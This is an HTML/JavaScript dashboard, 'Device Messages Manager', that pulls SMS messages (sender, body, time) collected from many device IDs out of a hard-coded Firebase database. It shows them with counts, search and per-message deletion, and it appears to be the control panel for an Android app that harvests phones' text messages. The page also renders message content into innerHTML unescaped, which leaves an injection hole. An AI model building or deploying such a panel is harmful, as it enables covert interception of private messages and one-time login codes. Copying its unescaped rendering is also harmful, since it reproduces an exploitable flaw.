<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Devicess Messages Manager</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f7fa;
            color: #333;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }
        h1 {
            color: #2c3e50;
            text-align: center;
            margin-bottom: 30px;
            font-size: 2.5em;
            font-weight: 300;
        }
        .stats-bar {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            display: flex;
            justify-content: space-around;
            text-align: center;
        }
        .stat-item {
            flex: 1;
        }
        .stat-number {
            font-size: 2em;
            font-weight: bold;
        }
        .stat-label {
            font-size: 0.9em;
            opacity: 0.9;
            margin-top: 5px;
        }
        .device-card {
            background-color: #ffffff;
            border: 2px solid #e3e8ee;
            border-radius: 12px;
            margin-bottom: 30px;
            overflow: hidden;
            box-shadow: 0 2px 15px rgba(0,0,0,0.08);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }
        .device-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 25px rgba(0,0,0,0.12);
        }
        .device-header {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            color: white;
            padding: 20px;
            cursor: pointer;
            user-select: none;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .device-header:hover {
            background: linear-gradient(135deg, #3e9bfe 0%, #00e0fe 100%);
        }
        .device-info {
            display: flex;
            flex-direction: column;
        }
        .device-name {
            font-size: 1.4em;
            font-weight: 600;
            margin-bottom: 5px;
        }
        .device-details {
            font-size: 0.9em;
            opacity: 0.9;
        }
        .device-stats {
            text-align: right;
        }
        .message-count {
            font-size: 2em;
            font-weight: bold;
        }
        .expand-icon {
            font-size: 1.2em;
            transition: transform 0.3s ease;
            margin-left: 15px;
        }
        .device-header.collapsed .expand-icon {
            transform: rotate(-90deg);
        }
        .messages-container {
            padding: 0;
            max-height: 600px;
            overflow-y: auto;
            transition: all 0.3s ease;
        }
        .messages-container.collapsed {
            max-height: 0;
            padding: 0;
        }
        .message-card {
            border-bottom: 1px solid #f0f2f5;
            padding: 20px;
            position: relative;
            transition: background-color 0.2s ease;
        }
        .message-card:hover {
            background-color: #f8f9fa;
        }
        .message-card:last-child {
            border-bottom: none;
        }
        .message-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 10px;
        }
        .message-meta {
            display: flex;
            flex-direction: column;
        }
        .sender {
            font-weight: 600;
            color: #2c3e50;
            font-size: 1.1em;
            margin-bottom: 3px;
        }
        .timestamp {
            color: #7f8c8d;
            font-size: 0.85em;
        }
        .message-body {
            color: #34495e;
            line-height: 1.6;
            white-space: pre-wrap;
            margin-bottom: 15px;
            background-color: #f8f9fc;
            padding: 15px;
            border-radius: 8px;
            border-left: 4px solid #3498db;
        }
        .delete-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 8px 15px;
            cursor: pointer;
            font-size: 0.85em;
            font-weight: 500;
            transition: all 0.2s ease;
            box-shadow: 0 2px 8px rgba(255, 107, 107, 0.3);
        }
        .delete-btn:hover {
            background: linear-gradient(135deg, #ff5252 0%, #d32f2f 100%);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(255, 107, 107, 0.4);
        }
        .delete-btn:active {
            transform: translateY(0);
        }
        .no-messages {
            text-align: center;
            color: #7f8c8d;
            font-style: italic;
            padding: 40px;
            background-color: #f8f9fa;
        }
        .loading {
            text-align: center;
            padding: 50px;
            color: #7f8c8d;
            font-size: 1.2em;
        }
        .error {
            color: #e74c3c;
            background-color: #fdf2f2;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #e74c3c;
            margin: 20px 0;
        }
        .controls {
            margin-bottom: 30px;
            text-align: center;
        }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            margin: 0 10px;
            transition: all 0.2s ease;
            box-shadow: 0 2px 10px rgba(102, 126, 234, 0.3);
        }
        .btn:hover {
            background: linear-gradient(135deg, #5a6fd8 0%, #6a4190 100%);
            transform: translateY(-1px);
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }
        .search-box {
            padding: 12px;
            border: 2px solid #e3e8ee;
            border-radius: 8px;
            font-size: 14px;
            width: 300px;
            margin: 0 10px;
            transition: border-color 0.2s ease;
        }
        .search-box:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        .highlight {
            background-color: #fff3cd;
            padding: 2px 4px;
            border-radius: 3px;
            font-weight: bold;
        }
        .message-id {
            font-family: monospace;
            font-size: 0.75em;
            color: #95a5a6;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Device Messages Manager</h1>
        
        <div class="controls">
            <input type="text" id="search-box" class="search-box" placeholder="Search messages...">
            <button class="btn" onclick="refreshData()">🔄 Refresh</button>
            <button class="btn" onclick="expandAll()">📂 Expand All</button>
            <button class="btn" onclick="collapseAll()">📁 Collapse All</button>
        </div>

        <div id="stats-container"></div>
        <div id="devices-container">
            <div class="loading">Loading devices and messages from Firebase...</div>
        </div>
    </div>

    <script>
        // Initialize Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyA_z1ekX-HjLfobKjOAKzNgmZHL5xOEBJw",
            authDomain: "m23dm1a2.firebaseapp.com",
            projectId: "m23dm1a2",
            storageBucket: "m23dm1a2.firebasestorage.app",
            messagingSenderId: "402219275845",
            appId: "1:402219275845:android:786ab56859cbe9b3a9b52c",
            databaseURL: "https://m23dm1a2-default-rtdb.europe-west1.firebasedatabase.app/"
        };

        // Initialize Firebase
        const app = firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const rootRef = database.ref();

        let allDevicesData = {};
        let searchTerm = '';

        // Function to highlight search terms
        function highlightText(text, search) {
            if (!search) return text;
            const regex = new RegExp(`(${search})`, 'gi');
            return text.replace(regex, '<span class="highlight">$1</span>');
        }

        // Function to check if message matches search
        function messageMatchesSearch(messageData, search) {
            if (!search) return true;
            const searchLower = search.toLowerCase();
            
            const messageBody = (messageData.messageBody || '').toLowerCase();
            const sender = (messageData.sender || '').toLowerCase();
            
            return messageBody.includes(searchLower) || sender.includes(searchLower);
        }

        // Function to format timestamp
        function formatTimestamp(timestamp) {
            if (!timestamp) return 'Unknown time';
            
            // Try to parse the timestamp
            let date;
            if (typeof timestamp === 'number') {
                date = new Date(timestamp);
            } else if (typeof timestamp === 'string') {
                date = new Date(timestamp);
            } else {
                return timestamp.toString();
            }
            
            if (isNaN(date.getTime())) {
                return timestamp.toString();
            }
            
            return date.toLocaleString();
        }

        // Function to display statistics
        function displayStats(devicesData) {
            let totalDevices = 0;
            let totalMessages = 0;
            
            Object.keys(devicesData).forEach(deviceId => {
                totalDevices++;
                const device = devicesData[deviceId];
                if (device.sms) {
                    totalMessages += Object.keys(device.sms).length;
                }
            });

            const statsContainer = document.getElementById('stats-container');
            statsContainer.innerHTML = `
                <div class="stats-bar">
                    <div class="stat-item">
                        <div class="stat-number">${totalDevices}</div>
                        <div class="stat-label">Total Devices</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">${totalMessages}</div>
                        <div class="stat-label">Total Messages</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">${Math.round(totalMessages / totalDevices) || 0}</div>
                        <div class="stat-label">Avg Messages/Device</div>
                    </div>
                </div>
            `;
        }

        // Function to display devices and messages
        function displayDevices(devicesData) {
            const container = document.getElementById('devices-container');
            
            if (!devicesData || Object.keys(devicesData).length === 0) {
                container.innerHTML = '<div class="error">No devices found in the database.</div>';
                return;
            }

            let devicesHtml = '';

            Object.entries(devicesData).forEach(([deviceId, deviceData]) => {
                const messages = deviceData.sms || {};
                const messageEntries = Object.entries(messages);
                
                // Filter messages based on search
                const filteredMessages = messageEntries.filter(([msgId, msgData]) => 
                    messageMatchesSearch(msgData, searchTerm)
                );

                // If searching and no messages match, skip this device
                if (searchTerm && filteredMessages.length === 0) {
                    return;
                }

                const messageCount = Object.keys(messages).length;
                const deviceName = deviceId.length > 20 ? `${deviceId.substring(0, 20)}...` : deviceId;

                let messagesHtml = '';
                if (filteredMessages.length === 0) {
                    messagesHtml = '<div class="no-messages">No messages found for this device</div>';
                } else {
                    messagesHtml = filteredMessages.map(([messageId, messageData]) => {
                        const messageBody = messageData.messageBody || 'No message content';
                        const sender = messageData.sender || 'Unknown Sender';
                        const timestamp = messageData.receivedTime || messageData.timestamp || 'Unknown time';

                        return `
                            <div class="message-card">
                                <div class="message-header">
                                    <div class="message-meta">
                                        <div class="sender">${highlightText(sender, searchTerm)}</div>
                                        <div class="timestamp">${formatTimestamp(timestamp)}</div>
                                        <div class="message-id">ID: ${messageId}</div>
                                    </div>
                                </div>
                                <div class="message-body">${highlightText(messageBody, searchTerm)}</div>
                                <button class="delete-btn" onclick="deleteMessage('${deviceId}', '${messageId}')">
                                    🗑️
                                </button>
                            </div>
                        `;
                    }).join('');
                }

                devicesHtml += `
                    <div class="device-card">
                        <div class="device-header" onclick="toggleDevice('${deviceId}')">
                            <div class="device-info">
                                <div class="device-name">${deviceName}</div>
                                <div class="device-details">Device ID: ${deviceId}</div>
                            </div>
                            <div class="device-stats">
                                <div class="message-count">${messageCount}</div>
                                <div class="stat-label">Messages</div>
                            </div>
                            <div class="expand-icon">▼</div>
                        </div>
                        <div class="messages-container" id="device-${deviceId}">
                            ${messagesHtml}
                        </div>
                    </div>
                `;
            });

            if (!devicesHtml && searchTerm) {
                container.innerHTML = '<div class="error">No messages found matching your search.</div>';
                return;
            }

            container.innerHTML = devicesHtml || '<div class="error">No devices to display.</div>';
        }

        // Function to toggle device expansion
        function toggleDevice(deviceId) {
            const container = document.getElementById(`device-${deviceId}`);
            const header = document.querySelector(`[onclick="toggleDevice('${deviceId}')"]`);
            
            if (container.classList.contains('collapsed')) {
                container.classList.remove('collapsed');
                header.classList.remove('collapsed');
            } else {
                container.classList.add('collapsed');
                header.classList.add('collapsed');
            }
        }

        // Function to delete a message
        function deleteMessage(deviceId, messageId) {
            const messageRef = database.ref(`Devices/${deviceId}/sms/${messageId}`);
            messageRef.remove()
                .catch((error) => {
                    console.error("Error deleting message:", error);
                });
        }

        // Function to expand all devices
        function expandAll() {
            document.querySelectorAll('.messages-container').forEach(container => {
                container.classList.remove('collapsed');
            });
            document.querySelectorAll('.device-header').forEach(header => {
                header.classList.remove('collapsed');
            });
        }

        // Function to collapse all devices
        function collapseAll() {
            document.querySelectorAll('.messages-container').forEach(container => {
                container.classList.add('collapsed');
            });
            document.querySelectorAll('.device-header').forEach(header => {
                header.classList.add('collapsed');
            });
        }

        // Function to fetch and display data with real-time updates
        function fetchAndDisplayData() {
            document.getElementById('devices-container').innerHTML = '<div class="loading">Loading devices and messages from Firebase...</div>';
            document.getElementById('stats-container').innerHTML = '';

            // Set up real-time listener for the Devices node
            database.ref('Devices').on('value', (snapshot) => {
                allDevicesData = snapshot.val() || {};
                displayStats(allDevicesData);
                displayDevices(allDevicesData);
            }, (error) => {
                console.error("Error fetching data:", error);
                document.getElementById('devices-container').innerHTML = 
                    '<div class="error">Error loading data from Firebase. Please check console for details.</div>';
            });
        }

        // Function to refresh data (manual refresh if needed)
        function refreshData() {
            // Since we're using real-time listeners, just display current data
            displayStats(allDevicesData);
            displayDevices(allDevicesData);
        }

        // Search functionality
        document.getElementById('search-box').addEventListener('input', (e) => {
            searchTerm = e.target.value;
            displayDevices(allDevicesData);
        });

        // Initialize the app when the page loads
        document.addEventListener('DOMContentLoaded', fetchAndDisplayData);

        // Make functions globally available
        window.toggleDevice = toggleDevice;
        window.deleteMessage = deleteMessage;
        window.refreshData = refreshData;
        window.expandAll = expandAll;
        window.collapseAll = collapseAll;
    </script>
</body>
</html>
